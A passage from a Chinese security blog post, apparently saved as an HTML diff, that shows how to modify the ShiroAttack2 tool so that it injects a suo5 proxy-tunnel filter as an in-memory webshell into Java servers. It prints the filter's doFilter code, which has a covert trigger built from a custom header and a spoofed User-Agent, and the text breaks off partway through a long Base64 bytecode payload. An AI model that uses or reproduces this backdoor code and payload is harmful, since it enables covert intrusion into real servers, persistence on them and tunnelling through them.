@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<title>
+    
+</title>
+<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+<meta name="author" content="loecho">
+<meta name="description" content="安全行业的从业人员">
+<meta name="keywords" content="">
+<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<link rel="stylesheet" href="https://1oecho.github.io/styles/main.css" />
+<link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
+    
+            <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/js/Card/prism.min.js"></script>
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/css/Card/prism.min.css" />
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
+            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
+            
+                <!--点击特效-->
+                <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/love.min.js"></script>
+                
+                        <!--CDN样式-->
+                        <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
+                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
+                        
+                            <script>
+                                (function() {
+                                    var bp = document.createElement('script');
+                                    var curProtocol = window.location.protocol.split(':')[0];
+                                    if (curProtocol === 'https') {
+                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                                    } else {
+                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                                    }
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(bp, s);
+                                })();
+                            </script>
+                            
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo">
+                <a href="https://1oecho.github.io">
+                    
+                </a>
+            </div>
+
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                        Index
+                    </a>
+                    
+                    <a class="menu-item" href="https://1oecho.github.io/tags">
+                        Tags
+                    </a>
+                    
+                    <a class="menu-item" href="https://github.com/loecho-sec">
+                        Whoami
+                    </a>
+                    
+                        <input id="switch_default" type="checkbox" class="switch_default">
+                        <label for="switch_default" class="toggleBtn"></label>
+            </div>
+            <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+            </form>
+        </div>
+    </nav>
+
+    
+        <nav class="navbar-mobile" id="nav-mobile">
+            <div class="container">
+                <div class="navbar-header">
+                    <div>
+                        <a href="https://1oecho.github.io">
+                            
+                        </a>
+                        <!--en-->
+                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
+                        <!--zh-->
+                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
+                    </div>
+                    <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+                    </form>
+                    <!--en-->
+                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
+                    <!--zh-->
+                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>
+
+                </div>
+                <div class="menu" id="mobile-menu">
+                    
+                        <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                            Index
+                        </a>
+                        
+                        <a class="menu-item" href="https://1oecho.github.io/tags">
+                            Tags
+                        </a>
+                        
+                        <a class="menu-item" href="https://github.com/loecho-sec">
+                            Whoami
+                        </a>
+                        
+                </div>
+            </div>
+        </nav>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementById("menu-toggle-en");
+        var toggleMenu_zh = document.getElementById("menu-toggle-zh");
+
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.display != "none") {
+            if (toggleMenu.classList.contains("active")) {
+                toggleMenu.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        } else if (toggleMenu_zh.display != "none") {
+            if (toggleMenu_zh.classList.contains("active")) {
+                toggleMenu_zh.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu_zh.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        }
+
+    }
+</script>
+            <div class="main">
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                ShiroAttack2：内存马-SUO5正向代理
+                            </h1>
+                            
+                                    <!--zh-->
+                                    <div class="post-meta zh">
+                                        &#x4F5C;&#x8005;:
+                                        <a itemprop="author" rel="author" href="/">
+                                            
+                                        </a>
+                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2023-04-21</a></span>
+                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
+                                    href="#">3.6
+                                    &#x5206;&#x949F;</a></span>
+                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">756</a></span>
+                                        
+                                                阅读量:
+                                                <span data-hk-page="current"> - </span>
+                                                
+                                    </div>
+                                    
+                        </header>
+                        
+                        <div class="post-content">
+                            <h2 id="0x01-工具参考">0x01 工具参考</h2>
+<p>https://github.com/zema1/suo5 - 一款高性能 HTTP 代理隧道工具</p>
+<figure data-type="image" tabindex="1"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852613.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852613.png" alt="image-20230402185208575" loading="lazy"></a></figure>
+<h2 id="0x02-代码实现">0x02 代码实现</h2>
+<h3 id="01-获取代码">01 获取代码</h3>
+<p>suo5 工具大佬提供了Filter的代码，直接拿来使用即可，</p>
+<ul>
+<li>https://github.com/zema1/suo5/tree/main/assets</li>
+</ul>
+<figure data-type="image" tabindex="2"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021905213.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021905213.png" alt="image-20230402190540195" loading="lazy"></a></figure>
+<h3 id="02-修改shiroattack2">02 修改ShiroAttack2</h3>
+<p>分析了下Shiro_Attack注入内存马的过程，直接开始修改，过程如下：</p>
+<ul>
+<li>第一步，直接在<code>src/main/java/com/summersec/x</code>找一个原有的Filter复制修改下类名，为了好区分起名<code>SUO5Filter</code>，补充所有方法和定义的变量，修改<code>Suo5Filter#doFilter</code>，补充调用到的函数和方法，以及变量即可。因为实际注入只需要接受path参数，pwd那些其他的删掉就行：</li>
+</ul>
+<pre><code class="language-java">public void doFilter(ServletRequest sReq, ServletResponse sResp, FilterChain chain) throws IOException, ServletException {
+
+        HttpServletRequest request = (HttpServletRequest) sReq;
+        HttpServletResponse response = (HttpServletResponse) sResp;
+
+        // 自己增加一个建立链接的判断
+        if (request.getHeader(&quot;Proxy&quot;).equals(&quot;UP&quot;)){ 
+        String agent = request.getHeader(&quot;User-Agent&quot;);
+        String contentType = request.getHeader(&quot;Content-Type&quot;);
+
+        // 建立代理的代码实际修改就可以，我就直接拿来使用了，注意服务端和客户端要对应
+        if (agent == null || !agent.equals(&quot;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3&quot;)) {
+            if (chain != null) {
+                chain.doFilter(sReq, sResp);
+            }
+            return;
+        }
+        if (contentType == null) {
+            return;
+        }
+
+        try {
+            if (contentType.equals(&quot;application/plain&quot;)) {
+                tryFullDuplex(request, response);
+                return;
+            }
+
+            if (contentType.equals(&quot;application/octet-stream&quot;)) {
+                processDataBio(request, response);
+            } else {
+                processDataUnary(request, response);
+            }
+        } catch (Throwable e) {
+        }
+        } else {
+            response.setStatus(404);
+            response.setHeader(&quot;Vary&quot;,&quot;No&quot;);
+        }
+
+        chain.doFilter(sReq, sResp);
+    }
+复制代码
+</code></pre>
+<ul>
+<li>第二步，通过自带的 <code>com/summersec/attack/deser/plugins/servlet/MemBytes.java</code>来生成我们修改好的Class，后续加载进去，增加一个新的值即可，Key是自己定义的名字后续调用时使用，Value是我们新增的Class的类名：</li>
+</ul>
+<figure data-type="image" tabindex="3"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852127.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852127.png" alt="img" loading="lazy"></a></figure>
+<ul>
+<li>第三步，生成SuoFilter的Base64编码的字节码，有自带的方法直接用就行：</li>
+</ul>
+<figure data-type="image" tabindex="4"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852569.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852569.png" alt="img" loading="lazy"></a></figure>
+<figure data-type="image" tabindex="5"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852405.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852405.png" alt="img" loading="lazy"></a></figure>
+<p>生成结果如下：</p>
+<pre><code class="language-java">MEM_TOOLS.put(&quot;Suo5Filter&quot;, &quot;yv66vgAAADQEHgoBGgJLCQDtAkwJAO0CTQgCTgkA7QJPCAJQCQDtAlEIAlIJAO0CUwkA7QJUCQDtAlUIAlYKACoCVwoAKgJYCAJZCgDtAloKAO0CWwgCXAoCXQJeCAJfCgAqAmAIAmEKAB4CYgcCYwoAGAJLCAJkCgAYAmUIAmYKABgCZwcCaAoAHgJpBwJqCgJrAmwKACACbQoAKgJuBwE7CAJvCgAeAnAIAnEKACoCcggCcwcCdAgCdQoAKgJ2CAJ3CAJ4CgAqAnkKARoCegoBGgJ7CAJ8CgJ9An4KACoCfwoCfQKABwKBCgJ9AoIKADYCgwoANgKECgAqAoUHAoYKAO0ChwgCiAsAVwKJCgDtAooIAosKACoCjAcCjQoAQgKOBwKPCgBEAksIApAIApEIApILAFgCkwsAVwKUCwBYApQKAO0ClQoARAKWCAKXCgA7AmcLAFgCmAoARAJnCgKZApoKApkCmwoCmQKcCgAeAp0HAW0HAp4HAp8IAqAIAqEKAB4CoggCowgBHAoAHgKkCgKlAqYKAqUCpwgBHgsAVwKoCgJdAqkKACoCqgsCqwKsCAKtBwKuBwKvBwKwCAKxCQKyArMKAqUCtAsCqwK1CQK2ArcKArgCuQsBiwK6CAK7CgJrAqYJArICvAgCvQgCvggBfAgCvwoAKgLACgJdAsEIAsIKADsCwwgCxAgCxQgCxggCxwgCyAgCyQsCygLLCALMCgDtAs0IAs4KAO0CzwoA7QLQBwLRCwBYAtIIAtMIAtQLAFgC1QcC1goAjQJLCgCNAtcKAtgC2QoC2ALaBQAAAAAAAADICgDvAtsLAFcC3AcC3QoAlgLeCgCWAt8HAuAKAJkC4QoAmQLiCgCZAuMKAJkC5AoAmQLlBwLmCgAeAucHAugKAJ8C6QgC6goC6wLsBwLtCgLrAu4KAusC7woAnwLwCwBXAvELAvIC8wsC8gL0CgCZAvUKAJkC9goA7QL3CgEAAvgKAQACmwoBAAKcCgCZAvkLAFcC%2BgoA7QL7CwBYAvwHAv0KALYCSwgC%2FgoAtgL%2FCAFbCAMABwMBCgC8AksKALYDAgsDAwMECwMFAwYLAwUDBwoAtgKnCgC8AwgKALwC%2BAoA7QMJCgC8AwoKAwsDDAoDCwMNCgMLAw4KAwsDDwoDCwMQBwMRCgDMAxIKAMwDEwoDCwMUCgMLAxUKAwsDFgMCAAAABwMXCAMYCgDTAt4IAxkKADsC3goDGgMbCAMcCgDtAx0IAx4HAx8KANwDEgoA7QMgCwBYAyEIAyIIAyMIAyQIAf8KAyUDJgcDJwoA5QJLBwMoCgDnAykKAOUDKgoA7QMrCgDlAvYKAOUDLAcDLQoA7QMuBwMvBwMwCgDvAzEKAO8DMgoA7QMzCgDlApwKAO8DNAoC2AM1CgDtAzYLAFcDNwsDOAKoCAM5CgC2AzoKAO0DOwoA7QM8CgCZAz0LAqsDPgcDPwoA7QNACgCZAywLAqsDQQsCqwNCCgDtA0MKAQcDRAcDRQoBBwNGBwNHCgEJA0gKACoDSQoDSgNLCgCWA0wJAO0DTQoAtgNOBwNPCANQBwNRCANSCANTCANUCANVCANWCANXCgDtA1gHA1kHA1oBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQACY3MBABJMamF2YS9sYW5nL1N0cmluZzsBAARwYXRoAQAFdG9rZW4BAAVhZGRycwEAE0xqYXZhL3V0aWwvSGFzaE1hcDsBAAlTaWduYXR1cmUBADpMamF2YS91dGlsL0hhc2hNYXA8TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9Cb29sZWFuOz47AQAJZ0luU3RyZWFtAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAKZ091dFN0cmVhbQEAFkxqYXZhL2lvL091dHB1dFN0cmVhbTsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHExjb20vc3VtbWVyc2VjL3gvU3VvNUZpbHRlcjsBAC4oTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvaW8vT3V0cHV0U3RyZWFtOylWAQACaW4BAANvdXQBAAx4b3JCNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQADc3JjAQADa2V5AQAGcmVzdWx0AQACW0IBAApFeGNlcHRpb25zAQAGYmFzZTY0AQAYKFtCTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAGQmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAVjb2RlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAA2I2NAEABG1vZGUBAApjbGFzc2J5dGVzAQANU3RhY2tNYXBUYWJsZQcCaAcCagEAA3hvcgEACChbQltCKVtCAQABaQEAAUkBAARkYXRhAQACbWwBAAJrbAEAA3B3ZAEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAANtZDUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAAW0BAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAAXMBAANyZXQHAnQHAoYBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAEdmFyNwEAA29iagEABm91dHB1dAEAGExqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEABXRhZ19zAQAFdGFnX2UHAy0HAo8BAAhwYXJzZU9iagEAFShMamF2YS9sYW5nL09iamVjdDspVgEAE1tMamF2YS9sYW5nL09iamVjdDsBAAVjbGF6egEAA3JlcQEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAhyZXF1ZXN0MgEABHJlc3ABAAR2YXI4AQAJYWRkRmlsdGVyAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAlmaWx0ZXJNYXABAAV2YXIyNAEADGZpbHRlck1hcE9iagEABG5hbWUBABFmaWx0ZXJTdGFydE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZmluZEZpbHRlck1hcHMBAApmaWx0ZXJNYXBzAQANdG1wRmlsdGVyTWFwcwEABWluZGV4AQAFdmFyMjcBAAV2YXIyOAEABXZhcjExAQAFdmFyMjUBAAxjb250ZXh0RmllbGQBABJhcHBsaWNhdGlvbkNvbnRleHQBAC1Mb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL0FwcGxpY2F0aW9uQ29udGV4dDsBAA9zdGFuZGFyZENvbnRleHQBACpMb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dDsBAApzdGF0ZUZpZWxkAQASZmlsdGVyUmVnaXN0cmF0aW9uBwNcAQAHRHluYW1pYwEADElubmVyQ2xhc3NlcwEAKkxqYXZheC9zZXJ2bGV0L0ZpbHRlclJlZ2lzdHJhdGlvbiREeW5hbWljOwEADnNlcnZsZXRDb250ZXh0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldENvbnRleHQ7AQAGZmlsdGVyAQAWTGphdmF4L3NlcnZsZXQvRmlsdGVyOwEACmZpbHRlck5hbWUBAAN1cmwHA10HA1oHA14HAq4HAq8HA1wHA18HAtEBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsHA2ABAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAVhZ2VudAEAC2NvbnRlbnRUeXBlAQAEc1JlcQEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEABXNSZXNwAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEABWNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwNhBwNiBwNjBwKeBwKfAQAHZGVzdHJveQEAGnJlYWRJbnB1dFN0cmVhbVdpdGhUaW1lb3V0AQAbKExqYXZhL2lvL0lucHV0U3RyZWFtO1tCSSlWAQAKcmVhZExlbmd0aAEACnJlYWRSZXN1bHQBAAJpcwEADXRpbWVvdXRNaWxsaXMBAAxidWZmZXJPZmZzZXQBAA1tYXhUaW1lTWlsbGlzAQABSgcDZAEACHJlZGlyZWN0AQBqKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZhL3V0aWwvSGFzaE1hcDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmV0L0h0dHBVUkxDb25uZWN0aW9uOwEAA2N0eAEAGkxqYXZheC9uZXQvc3NsL1NTTENvbnRleHQ7AQABawEAB2RhdGFNYXABAARyVXJsAQAGbWV0aG9kAQABdQEADkxqYXZhL25ldC9VUkw7AQAEY29ubgEAHExqYXZhL25ldC9IdHRwVVJMQ29ubmVjdGlvbjsBAAdoZWFkZXJzAQAXTGphdmEvdXRpbC9FbnVtZXJhdGlvbjsBAARyb3V0AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAKUxqYXZhL3V0aWwvSGFzaE1hcDxMamF2YS9sYW5nL1N0cmluZztbQj47AQArTGphdmEvdXRpbC9FbnVtZXJhdGlvbjxMamF2YS9sYW5nL1N0cmluZzs%2BOwcC3QcC4AcDZQEAgChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YS91dGlsL0hhc2hNYXA8TGphdmEvbGFuZy9TdHJpbmc7W0I%2BO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uZXQvSHR0cFVSTENvbm5lY3Rpb247AQANdHJ5RnVsbER1cGxleAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAAluZXdDcmVhdGUBABYoQilMamF2YS91dGlsL0hhc2hNYXA7AQABQgEAB25ld0RhdGEBABcoW0IpTGphdmEvdXRpbC9IYXNoTWFwOwEABm5ld0RlbAEAFSgpTGphdmEvdXRpbC9IYXNoTWFwOwEACW5ld1N0YXR1cwEACnUzMnRvQnl0ZXMBAAUoSSlbQgEACmJ5dGVzVG9VMzIBAAUoW0IpSQEABWJ5dGVzAQAHbWFyc2hhbAEAFyhMamF2YS91dGlsL0hhc2hNYXA7KVtCAQAFdmFsdWUBAANidWYBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQAEZGJ1ZgEAFUxqYXZhL25pby9CeXRlQnVmZmVyOwcDAQcDZgcC%2FQcDZwEALShMamF2YS91dGlsL0hhc2hNYXA8TGphdmEvbGFuZy9TdHJpbmc7W0I%2BOylbQgEACXVubWFyc2hhbAEAKihMamF2YS9pby9JbnB1dFN0cmVhbTspTGphdmEvdXRpbC9IYXNoTWFwOwEABGtMZW4BAAFTAQAEdkxlbgEABnJlYWRlcgEAGUxqYXZhL2lvL0RhdGFJbnB1dFN0cmVhbTsBAAZoZWFkZXIBAAJiYgEAA2xlbgEAAXgBAAJicwcDaAcDEQEAQChMamF2YS9pby9JbnB1dFN0cmVhbTspTGphdmEvdXRpbC9IYXNoTWFwPExqYXZhL2xhbmcvU3RyaW5nO1tCPjsBAA5wcm9jZXNzRGF0YUJpbwEAAnNjAQARTGphdmEvbmV0L1NvY2tldDsBAAFwAQAOcmVxSW5wdXRTdHJlYW0BAAlyZXFSZWFkZXIBAB1MamF2YS9pby9CdWZmZXJlZElucHV0U3RyZWFtOwEABmFjdGlvbgEADXJlc3BPdXRTdHJlYW0BAARob3N0AQAEcG9ydAEAC3NjT3V0U3RyZWFtAQAKc2NJblN0cmVhbQEAAXQBABJMamF2YS9sYW5nL1RocmVhZDsHAx8HAz8HAycHAy8BAApyZWFkU29ja2V0AQAvKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2lvL091dHB1dFN0cmVhbTtaKVYBAAFuAQAHZGF0YVRtcAEAC2lucHV0U3RyZWFtAQAMb3V0cHV0U3RyZWFtAQALbmVlZE1hcnNoYWwBAAFaAQAHcmVhZEJ1ZgEAB3JlYWRSZXEBADYoTGphdmEvaW8vQnVmZmVyZWRJbnB1dFN0cmVhbTtMamF2YS9pby9PdXRwdXRTdHJlYW07KVYBAA5idWZJbnB1dFN0cmVhbQEAD3NvY2tldE91dFN0cmVhbQEAEHByb2Nlc3NEYXRhVW5hcnkBAAhyZWFkRnJvbQEACGNsaWVudElkAQAMcmVkaXJlY3REYXRhAQAMbmVlZFJlZGlyZWN0AQALcmVkaXJlY3RVcmwBAANydW4BAAtjb2xsZWN0QWRkcgEACmlmYWNlSW5kZXgBAARhZGRyAQAWTGphdmEvbmV0L0luZXRBZGRyZXNzOwEAA25pZgEAG0xqYXZhL25ldC9OZXR3b3JrSW50ZXJmYWNlOwEACWFkZHJlc3NlcwEABG5pZnMBAC9MamF2YS91dGlsL0VudW1lcmF0aW9uPExqYXZhL25ldC9JbmV0QWRkcmVzczs%2BOwEANExqYXZhL3V0aWwvRW51bWVyYXRpb248TGphdmEvbmV0L05ldHdvcmtJbnRlcmZhY2U7PjsHA0UHA0cBADwoKUxqYXZhL3V0aWwvSGFzaE1hcDxMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL0Jvb2xlYW47PjsBAAtpc0xvY2FsQWRkcgEAFShMamF2YS9sYW5nL1N0cmluZzspWgEAAmlwAQAGdmVyaWZ5AQAvKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZheC9uZXQvc3NsL1NTTFNlc3Npb247KVoBAAhob3N0bmFtZQEAB3Nlc3Npb24BABpMamF2YXgvbmV0L3NzbC9TU0xTZXNzaW9uOwEAEmNoZWNrQ2xpZW50VHJ1c3RlZAEAOihbTGphdmEvc2VjdXJpdHkvY2VydC9YNTA5Q2VydGlmaWNhdGU7TGphdmEvbGFuZy9TdHJpbmc7KVYBACVbTGphdmEvc2VjdXJpdHkvY2VydC9YNTA5Q2VydGlmaWNhdGU7AQAIYXV0aFR5cGUHA2kBABJjaGVja1NlcnZlclRydXN0ZWQBABJnZXRBY2NlcHRlZElzc3VlcnMBACcoKVtMamF2YS9zZWN1cml0eS9jZXJ0L1g1MDlDZXJ0aWZpY2F0ZTsBAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEABHZhcjYBAAxiYXNlNjREZWNvZGUBAAdkZWNvZGVyAQAEdmFyNQEAA3N0cgEACDxjbGluaXQ%2BAQAKU291cmNlRmlsZQEAD1N1bzVGaWx0ZXIuamF2YQwBLAEtDAEcAR0MAR4BHwEABVVURi04DAEgASEBABAvZmF2aWNvbmRlbW8uaWNvDAEiASEBAAAMASMBIQwBKAEpDAEqASsBABA%2FPz8%2FPz8%2FPz8%2FPz8%2FPz8%2FDANqA2sMA2wDbQEABkRlY29kZQwBPQE%2BDAFJAUoBAAxqYXZhLnZlcnNpb24HA24MA28BWAEAAzEuOQwDcANxAQAQamF2YS51dGlsLkJhc2U2NAwDcgNzAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAANnZXQMA3QDdQEAAXIMA3YBdQEAD2phdmEvbGFuZy9DbGFzcwwDdwN4AQAQamF2YS9sYW5nL09iamVjdAcDXwwDeQN6DAN7A3wMA30BdQEAD3N1bi5taXNjLkJBU0U2NAwDfgN%2FAQAGRW5jb2RlDAFfAWABAAxlbmNvZGVCdWZmZXIBABBqYXZhL2xhbmcvU3RyaW5nAQABDQwDgAOBAQABCgEADGRlY29kZUJ1ZmZlcgwBLAOCDAEsAVEMA4MDhAEAA01ENQcDhQwDhgOHDAOIA4kMA4oDiwEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAOMA20MASwDjQwDdgNrDANqA44BABNqYXZhL2xhbmcvRXhjZXB0aW9uDAFrAWwBAAxYLUF1dGgtVG9rZW4MA48BWAwBNgE3AQACOjoMA5ADkQEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAEsA5IBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyAQAEPCEtLQEAAiE%2BAQAJdGV4dC9odG1sDAOTA5QMA5UDlAwBdAF1DAN0A5YBAAlFUlJPUjovLyAMA5cDmAcDmQwDmgOUDAObAS0MA5wBLQwDnQOeAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAdamF2YXguc2VydmxldC5qc3AuUGFnZUNvbnRleHQBAApnZXRSZXF1ZXN0DAOfA3gBAAtnZXRSZXNwb25zZQwDoAOhBwNeDAOiA6MMAmQDpAwDpQOmDAOnA6gMA6kDqgcDXQwDqwOsAQAHY29udGV4dAEAK29yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkNvbnRleHQBAChvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0AQAmb3JnL2FwYWNoZS9jYXRhbGluYS91dGlsL0xpZmVjeWNsZUJhc2UBAAVzdGF0ZQcDrQwDrgOvDAOwA7EMAXQDsgcDswwDtAO1BwO2DAO3A7gMA7kDugEAC2ZpbHRlclN0YXJ0DAO7A68BAC9vcmcuYXBhY2hlLnRvbWNhdC51dGlsLmRlc2NyaXB0b3Iud2ViLkZpbHRlck1hcAEAJG9yZy5hcGFjaGUuY2F0YWxpbmEuZGVwbG95LkZpbHRlck1hcAEADWdldEZpbHRlck5hbWUMA7wCMQwDvQO%2BAQAGUnVuaW5nDAO%2FAXUBAAdBbHJlYWR5AQAFUHJveHkBAAJVUAEAClVzZXItQWdlbnQBAAxDb250ZW50LVR5cGUBAG5Nb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNi4wOyBOZXh1cyA1IEJ1aWxkL01SQTU4TikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4xLjIuMwcDYwwBogPAAQARYXBwbGljYXRpb24vcGxhaW4MAdIB0wEAGGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQwB%2FAHTDAIcAdMBABNqYXZhL2xhbmcvVGhyb3dhYmxlDAPBA8IBAARWYXJ5AQACTm8MA8MDxAEADmphdmEvdXRpbC9EYXRlDAPFA6gHA2gMA8YDiQwDxwPIDAPJA8oMA3cBdQEADGphdmEvbmV0L1VSTAwBLAOUDAPLA8wBABpqYXZhL25ldC9IdHRwVVJMQ29ubmVjdGlvbgwDzQOUDAPOA8IMA88DwgwD0AOjDAPRA6M